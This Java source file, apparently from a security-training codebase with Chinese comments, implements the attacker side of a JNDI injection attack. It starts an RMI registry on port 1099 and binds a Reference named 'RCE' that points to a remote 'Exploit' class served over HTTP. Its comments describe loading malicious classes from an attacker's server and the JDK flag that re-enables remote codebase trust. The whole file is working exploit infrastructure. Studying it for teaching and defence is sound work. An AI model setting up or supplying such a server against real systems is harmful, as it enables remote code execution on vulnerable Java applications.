package com.madaha.codesecone.controller.jndi.JndiInject_Controller;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * JNDI + RMI 攻击利用
 * @poc rmi:127.0.0.0:1099/Object
 *
 * JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false。
 * 运行时需加入参数 -D com.sun.jndi.rmi.object.trustURLCodebase=true 。
 * 因为如果 JDK 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 RMI 代码。
 */
public class JNDIRmiServer {
    public static void main(String[] args) throws Exception {

        // 注册本地 rmi 服务，初始化端口为默认 1099 端口。
        Registry registry = LocateRegistry.createRegistry(1099);


        /**
         * Reference 封装的是恶意服务器上的类文件：
         *
         *   （1）使用 Reference 工程，构建引用对象；
         *
         *   （2）使用 Reference 包装，封装攻击者服务器上的恶意类：
         *      参数1：className – 远程加载时所使用的类名
         *      参数2：classFactory – 加载的class中需要实例化类的名称
         *      参数3：classFactoryLocation – 提供classes数据的地址可以是file/ftp/http协议
         */
        Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:65500/");


        /**
         * RMI远程调用条件：
         *    1、要想进行远程 RMI 调用，必须要实现 Remote 接口。
         *    2、RMI远程调用，必须要创建注册器，生成 stub（存根） 和 Skeleton（骨架）。
         *
         *    3、因为 ReferenceWrapper 继承了 UnicastRemoteObject类，并实现了 RemoteReference（继承了Remote接口）接口。
         *    4、所以此处使用 ReferenceWrapper() 进行包装，用于获取远程 恶意类对象。
         */
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);


        // 将 rmi 服务与 wrapper 进行 注册+绑定，以此来提供远程服务器上的对象为客户端使用；
        registry.bind("RCE", wrapper);


        System.out.println("[+] rmi://127.0.0.1:1099/RCE" + "   Jndi + RMI 服务已启动！");
    }
}
